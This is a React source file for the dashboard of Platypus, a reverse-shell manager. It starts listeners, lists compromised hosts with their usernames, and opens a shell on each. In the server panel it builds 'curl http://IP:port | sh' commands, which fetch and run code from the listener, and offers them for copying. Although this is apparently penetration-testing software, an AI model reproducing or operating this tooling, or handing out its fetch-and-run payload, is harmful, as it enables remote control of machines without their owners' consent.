import React from "react";
import {
  notification,
  message,
  InputNumber,
  Table,
  Tag,
  Divider,
  Button,
  Tooltip,
  Badge,
  Layout,
  Menu,
  Input,
  Alert,
  Tabs,
  Descriptions,
  Collapse,
} from "antd";

import "./App.css";
import qs from "qs";
import { CopyToClipboard } from "react-copy-to-clipboard";
const { Panel } = Collapse;
const { Search } = Input;
const axios = require("axios");
axios.defaults.headers.post["Content-Type"] =
  "application/x-www-form-urlencoded";
const { TabPane } = Tabs;

const moment = require("moment");
var W3CWebSocket = require("websocket").w3cwebsocket;

message.config({
  duration: 3,
  maxCount: 5,
  rtl: true,
});

const { Header, Content, Sider } = Layout;

// let baseUrl = ["http://", window.location.host].join("");
let baseUrl = ["http://", "127.0.0.1:7331"].join("");
let apiUrl = [baseUrl, "/api"].join("");
let wsUrl = ["ws://", window.location.host, "/notify"].join("");

const columns = [
  {
    title: "Address",
    dataIndex: "host",
    key: "host",
    align: "center",
    render: (data, line, index) => {
      return (
        <Tooltip title={"Hash:" + line.hash}>
          <span>{line.host + ":" + line.port}</span>
        </Tooltip>
      );
    },
  },
  {
    title: "OS",
    dataIndex: "os",
    key: "os",
    align: "center",
    render: (data) => {
      switch (data) {
        case 1:
          return "Linux";
        case 2:
          return "Windows";
        case 3:
          return "SunOS";
        case 4:
          return "MacOS";
        case 5:
          return "FreeBSD";
        default:
          return "Unknown Operating System";
      }
    },
  },
  {
    title: "Username",
    dataIndex: "user",
    key: "user",
    align: "center",
    render: (data) => {
      let color = "green";
      if (data === "root") {
        color = "red";
      }
      return <Tag color={color}>{data}</Tag>;
    },
  },
  {
    title: "Online Time",
    dataIndex: "timestamp",
    key: "timestamp",
    align: "center",
    render: (data) => {
      return "Onlined at " + moment(data).fromNow();
    },
  },
  {
    title: "Action",
    key: "x",
    render: (data, line, index) => {
      return (
        <Button>
          <a
            href={baseUrl + "/shell/?" + line.hash}
            target={"_blank"}
            rel={"noreferrer"}
          >
            Shell
          </a>
        </Button>
      );
    },
  },
];

function generateClientsArray(data) {
  let clients = [];
  for (let [k, v] of Object.entries(data)) {
    v.hash = k;
    v.key = k;
    clients.push(v);
  }
  return clients;
}

class App extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      bottom: "bottomLeft",
      serversResponse: null,
      servers: [],
      clients: [],
      endPointAlive: true,
      serverPort: 0,
      currentServer: null,
    };
  }

  fetchData() {
    axios
      .get([apiUrl, "/server"].join(""))
      .then((response) => {
        let servers = [];

        this.setState({ serversResponse: response.data.msg });

        for (let [k, v] of Object.entries(response.data.msg)) {
          v.hash = k;
          v.key = k;
          servers.push(v);
        }

        if (servers.length > 0) {
          this.setState({ currentServer: servers[0] });

          this.setState({
            clients: generateClientsArray(servers[0].clients),
          });
        }

        this.setState({ servers: servers });
      })
      .then(() => {
        if (this.state.clients.length > 0) {
          axios
            .get(apiUrl + "/server/" + this.state.servers[0].hash + "/client")
            .then((response) => {
              this.setState({
                clients: generateClientsArray(response.data.msg),
              });
            });
        }
      })
      .catch((error) => {
        this.setState({ endPointAlive: false });
        message.error("Cannot connect to API EndPoint: " + error, 5);
      });
  }

  componentDidMount() {
    this.fetchData();

    var client = new W3CWebSocket(wsUrl);
    client.onerror = () => {
      message.error("WebSocket connect failed!", 5);
    };
    client.onopen = () => {
      message.success("WebSocket connected!", 5);
    };
    client.onmessage = (e) => {
      let CLIENT_CONNECTED = 0;
      let CLIENT_DUPLICATED = 1;
      let data = JSON.parse(e.data);
      switch (data.Type) {
        case CLIENT_CONNECTED:
          console.log(data);
          let onlinedClient = data.Data.Client;
          message.success(
            "New client connected from: " +
              onlinedClient.host +
              ":" +
              onlinedClient.port,
            5
          );
          // Update data
          this.fetchData();
          break;
        case CLIENT_DUPLICATED:
          let duplicatedClient = data.Data.Client;
          message.error(
            "Duplicated client connected from: " +
              duplicatedClient.host +
              ":" +
              duplicatedClient.port +
              ", connection reseted.",
            5
          );
          break;
        default:
          notification.open({
            message: "Error websocket message",
            description: "Description",
            duration: 0,
          });
          break;
      }
    };
    client.onclose = () => {
      message.error("WebSocket disconnected!", 5);
    };
  }

  render() {
    let hint;
    if (this.state.currentServer == null) {
      hint = (
        <Alert
          message="Warning"
          description="Please start and select a server"
          type="warning"
          showIcon
          closable
        />
      );
    } else {
      hint = (
        <div>
          <Divider orientation="left"></Divider>
          <Descriptions title="Server Info">
            <Descriptions.Item label="Address">
              {this.state.currentServer.host +
                ":" +
                this.state.currentServer.port}
            </Descriptions.Item>
            <Descriptions.Item label="Clients">
              {this.state.currentServer?Object.keys(this.state.currentServer.clients).length:0}
            </Descriptions.Item>
            <Descriptions.Item label="Started">
              {moment(this.state.timestamp).fromNow()}
            </Descriptions.Item>
          </Descriptions>
          <Collapse>
            <Panel header="Expand to show the server info and the reverse shell commands for the current server">
              <Tabs defaultActiveKey="1">
                {this.state.currentServer.interfaces.map((value, index) => {
                  let command = [
                    "curl http://",
                    value,
                    ":",
                    this.state.currentServer.port,
                    " | sh",
                  ].join("");
                  return (
                    <TabPane tab={value} key={index}>
                      <Tag>{command}</Tag>
                      <CopyToClipboard
                        text={command}
                        onCopy={() => this.setState({ copied: true })}
                      >
                        <button>Click to copy</button>
                      </CopyToClipboard>
                    </TabPane>
                  );
                })}
              </Tabs>
            </Panel>
          </Collapse>
        </div>
      );
    }

    return (
      <Layout>
        <Header className="header">
          <div className="logo" />
          <h1>
            <a href="https://github.com/WangYihang/Platypus">Platypus</a>
          </h1>
        </Header>
        <Layout style={{ height: "100%" }}>
          <Sider width={200} className="site-layout-background">
            <Menu
              mode="inline"
              defaultSelectedKeys={["1"]}
              defaultOpenKeys={["sub1"]}
              style={{ height: "100%" }}
            >
              <InputNumber
                min={1}
                max={65565}
                defaultValue={13337}
                onChange={(data) => {
                  this.setState({
                    serverPort: parseInt(data),
                  });
                }}
              />
              <Button
                type="primary"
                onClick={() => {
                  axios
                    .post(
                      [apiUrl, "/server"].join(""),
                      qs.stringify({
                        host: "0.0.0.0",
                        port: this.state.serverPort,
                      })
                    )
                    .then((response) => {
                      console.log(response);
                      if (response.data.status) {
                        message.success(
                          "Server created at: " +
                            response.data.msg.host +
                            ":" +
                            response.data.msg.port,
                          5
                        );
                        this.fetchData();
                      } else {
                        message.error(
                          "Server create failed: " + response.data.msg,
                          5
                        );
                      }
                    })
                    .catch((error) => {
                      message.error(
                        "Cannot connect to API EndPoint!" + error,
                        5
                      );
                    });
                }}
              >
                Add server
              </Button>
              {this.state.servers.map((value, index) => {
                return (
                  <>
                  <Menu.Item
                    key={value.hash}
                    onClick={(item, key, keyPath, domEvent) => {
                      this.setState({
                        currentServer: this.state.serversResponse[item.key],
                      });
                    }}
                  >
                  {value.host + ":" + value.port}
                  <Badge count={Object.keys(value.clients).length} overflowCount={99} offset={[10, 0]}></Badge>
                </Menu.Item>
                
                </>
                );
              })}
            </Menu>
          </Sider>
          <Layout style={{ padding: "0 24px 24px" }}>
            <Content style={{ margin: "0 0" }}>
              {hint}
              <Table
                columns={columns}
                pagination={{ position: [this.state.bottom] }}
                // dataSource={() => {
                //   return []
                //   if (!this.state.currentServer) {
                //     return []
                //   } else {
                //     return generateClientsArray(this.state.currentServer.clients)
                //   }
                  
                // }}
                dataSource={generateClientsArray(this.state.currentServer?this.state.currentServer.clients:[])}
              />
            </Content>
          </Layout>
        </Layout>
      </Layout>
    );
  }
}

export default App;
